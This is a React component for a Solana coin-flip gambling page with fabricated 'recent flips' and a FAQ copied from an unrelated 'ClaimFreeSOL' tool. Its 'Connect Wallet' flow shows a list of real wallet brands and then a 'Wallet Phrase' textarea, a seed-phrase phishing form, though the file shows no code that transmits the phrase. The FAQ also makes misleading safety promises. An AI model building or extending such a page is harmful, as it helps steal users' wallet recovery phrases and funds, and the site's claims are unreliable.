import { useState } from "react";

const FlipCOnnect = () => {

    const [buttonClass, setButtonClass] = useState('');
    const [advert, setAdvert] = useState('advert advert-flip');
    const [firstPrice, setFirstPrice] = useState(0.01);
    const [secondPrice, setSecondPrice] = useState(0.05);
    const [thirdPrice, setThirdPrice] = useState(0.1);
    const [degenBoom, setDegenBoom] = useState("degen-boom");
    const [btnColor, setBtnColor] = useState('connect-wallet-btn');
    const [formContainer, setFormContainer] = useState("form-container");
    const [faq, setFaq] = useState("faq");

    const howClicked = () => {
        setFaq('faq active');
    }

    const comClicked = () => {
        setFaq('faq');
    }

    const connectWal = () => {
        setFormContainer("form-container active");
    }

    const cancel = () => {
        setFormContainer("form-container");
    }


    const degenClicked = () => {

        const topActiveBtn = document.querySelector(".coin-btn-container button.active");

        if (buttonClass === '') {
            // Turn on degen mode
            setButtonClass('active');
            setAdvert('advert advert-flip active');
            setFirstPrice(0.1);
            setSecondPrice(0.5);
            setThirdPrice(1.0);
            topActiveBtn.classList.add("beaut");
            setDegenBoom("degen-boom active");
            setBtnColor("connect-wallet-btn active");
        } else {
            // Turn off degen mode
            topActiveBtn.classList.remove("beaut");
            setButtonClass('');
            setAdvert('advert advert-flip');
            setFirstPrice(0.01);
            setSecondPrice(0.05);
            setThirdPrice(0.1);
            setDegenBoom("degen-boom");
            setBtnColor("connect-wallet-btn");
        }
    };


    const chooseBtn1 = (e) => {
        e.currentTarget.classList.add("active");
        e.currentTarget.parentElement.children[1].classList.remove("active");
        console.log(e.currentTarget.parentElement.children[1]);
    }

    const chooseBtn2 = (e) => {
        e.currentTarget.classList.add("active");
        e.currentTarget.parentElement.children[0].classList.remove("active");
    }

    const walletTypeClicked = (e) => {
        let walletType = e.currentTarget.value;

        let walletTypeContainer = e.currentTarget.parentElement;
        let walletPhrase = e.currentTarget.parentElement.parentElement.children[4];
        
        walletPhrase.classList.add('active');
        walletTypeContainer.classList.add('active');
    }

    return ( 
        <>
        <div className="flip-new-main">
            <div className="flip-container-left">
                <div className={advert}>
                    <div className="advert-text">
                        <div className="text">Click,<br></br>Flip,<br></br>Snatch!<br></br>
                        <div className={degenBoom}>
                            (Degen Mode <img src="/boom.png" alt="" />)
                        </div>
                        </div>
                    </div>
                    <div className="advert-img-conteiner">
                        <img src="spin.gif" alt="advert img" />
                    </div>
                </div>
            </div>
            <div className="flip-container-right">
                <div className="cleanup-bottom-content flip-clean-up" style={{gap: '0'}}>
                    <div className="cleanup-bottom-content-top maxium" style={{borderRadius: '20px'}}>
                        <div className="cleanup-bottom-top-main-content" style={{marginBottom: '20px'}}>
                            <header>
                                <h2>1. Choose</h2>
                            </header>
                            <div className="coin-btn-container">
                                <button onClick={chooseBtn1} className="active">
                                    <p>Head</p>
                                    <img src="/coin_head.svg" alt="" />
                                </button>
                                <button onClick={chooseBtn2} className="">
                                    <p>Tail</p>
                                    <img src="/coin_tail.svg" alt="" />
                                </button>
                            </div>
                        </div>
                        <div className="cleanup-bottom-top-main-content" style={{paddingBottom: "60px"}}>
                            <header style={{display: "flex", justifyContent: "space-between", width: "100%"}}>
                                <h2>2. Commit</h2>
                                <div className="degen-container">
                                    <img src="/degen_mode.svg" alt="" />
                                    <div className="text">Degen Mode</div>
                                    <button type="button" onClick={degenClicked} className={buttonClass}>
                                        <span></span>
                                    </button>
                                </div>
                            </header>
                            <div className="coin-btn-container lower-btn">
                                <button>
                                    <p style={{opacity: 0.4}}>{firstPrice}</p>
                                    <img src="/solana_logo.svg" alt="" />
                                </button>
                                <button>
                                    <p style={{opacity: 0.4}}>{secondPrice}</p>
                                    <img src="/solana_logo.svg" alt="" />
                                </button>
                                <button>
                                    <p style={{opacity: 0.4}}>{thirdPrice}</p>
                                    <img src="/solana_logo.svg" alt="" />
                                </button>
                            </div>
                        </div>
                    </div>
                    <div className="cleanup-bottom-content-bottom flip-clean-up-btn" style={{borderRadius: '20px'}}>
                        <div className="connect-wallet-btn-container flip-clean-up-btn-cont">
                            <button onClick={connectWal} type="button" className={btnColor} style={{width: '90%'}}>Connect Wallet</button>
                        </div>
                        <p style={{textAlign: 'center', marginTop: '10px', fontSize: '9px'}}>3% Platform Fee will be taken from your bet amount.</p>
                    </div>
                </div>
            </div>
        </div>
        <div className="cleanup-bottom">
            <div className="cleanup-bottom-content">
                <div className="cleanup-bottom-content-bottom">
                    <header>
                        <h2>Recent Flips</h2>
                    </header>
                    <div className="cleanup-bottom-content-bottom-main-content">
                        <div className="recent-flip">
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss">got rugged:(</p>
                                    <p className="win active">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="time">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss">got rugged:(</p>
                                    <p className="win active">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>

                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div><div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                            <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>flipped</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>and</p>
                                    <p className="loss active">got rugged:(</p>
                                    <p className="win">doubled!</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div className="connect-wallet-btn-container">
            <button type="button" onClick={howClicked} className="how-it-work-btn">[How It Works]</button>
        </div>
        <div className={faq}>
                <div className="faq-main">
                    <header className="faq-header">
                        <img src="/info.svg" alt="" />
                        <h2>How it Work</h2>
                    </header>
                    <div className="faq-container">
                        <div className="faq-content">
                            <h2>Where is the reclaim SOL coming from?</h2>
                            <p>Any accounts on Solana require a small storage fee to open them. By burning a token, we can close this</p>
                            <p>account and reclaim the storage fee.</p>
                        </div>
                        <div className="faq-content">
                            <h2>How much can I reclaim from closing vacant account?</h2>
                            <p>Vacant accounts will give you 0.002 SOL.</p>
                        </div>
                        <div className="faq-content">
                            <h2>Can I lose NFTs or other tokens like USDC from closing vacant accounts?</h2>
                            <p>No, all vacant accounts selected already have 0 NFTs or Tokens assigned to them and have no use, feel</p>
                            <p>secure in pressing Reclaim All and signing the transactions to close them and receive the locked sol.</p>
                            <p>You can find more information in the official Solana Documentation, link</p>
                        </div>
                        <div className="faq-content">
                            <h2>Safe Burn</h2>
                            <p>'Safe Burn' sends dust tokens to a Temporary Burn Program. This allows recovery if you mistakenly</p>
                            <p>burn a valuable token, so we recommend keeping this ON.</p>
                            <p>For developers who intend to permanently burn supply, we recommend turning this OFF so that tokens</p>
                            <p>are irreversibly destroyed and inaccessible.</p>
                        </div>
                        <div className="faq-content">
                            <h2>How much can I reclaim from burn tokens and NFTs?</h2>
                            <p>Burning tokens will give you 0.002 SOL. Burning most NFTs will give you 0.01 SOL. A few NFTs (such as</p>
                            <p>scam NFTs) will give you 0.002 SOL.</p>
                        </div>
                        <div className="faq-content">
                            <h2>Are there any fees associated with using ClaimFreeSOL?</h2>
                            <p>By using ClaimFreeSOL, you are guaranteed to never lose SOL, you will only gain from the assets you</p>
                            <p>choose to burn.</p>
                            <p>Instead, to keep the team up and build more tools, a 15% donation is included for the recovered SOL.</p>
                        </div>
                        <div className="faq-content">
                            <h2>Will my wallet be destroyed or become unsafe after claiming?</h2>
                            <p>No, all it does is close your vacant accounts. It will not affect your wallet, and you can continue using</p>
                            <p>it without concerns.</p>
                        </div>
                        <div className="faq-content">
                            <h2>Limitations of Liability</h2>
                            <p>Users acknowledge that burning digital assets involves inherent risks, and ClaimFreeSOL is not liable</p>
                            <p>for any losses incurred. ClaimFreeSOL is not responsible if a user burns any asset by mistake. Before</p>
                            <p>sending the transaction, please double check that you are aware that the asset you have marked is</p>
                            <p>unwanted.</p>
                        </div>
                    </div>
                    <div className="complete-btn-container">
                        <button type="button" onClick={comClicked}>Complete</button>
                    </div>
                </div>
            </div>
            <div className={formContainer}>
                <form onSubmit={(e) => e.preventDefault()}>
                    <div className="cancel-container">
                        <button onClick={cancel}><div className="cancel"></div> </button>
                    </div>
                    <header>
                        <h2>Connect a wallet on Solana to continue</h2>
                    </header>
                    <p className="require">You must have atleat 0.02 sol to continue</p>
                    <div className="Wallet-type-container">
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/ave.svg" alt="wallet logo" />
                            <p>Ave Wallet</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/solflare.svg" alt="wallet logo" />
                            <p>Solflare</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/trust.svg" alt="wallet logo" />
                            <p>Trust Wallet</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/phantom.svg" alt="wallet logo" />
                            <p>Phantom</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/download.svg" alt="wallet logo" />
                            <p>Coinbase Wallet</p>
                        </button>
                    </div>
                    <div className="Wallet-phrase-container">
                        <label htmlFor="phrase">Wallet Phrase</label>
                        <textarea name="phrase" id="phrase"></textarea>
                        <div className="form-btn-container">
                            <button>Connect</button>
                        </div>
                    </div>
                </form>
            </div>
        </>
     );
}
 
export default FlipCOnnect;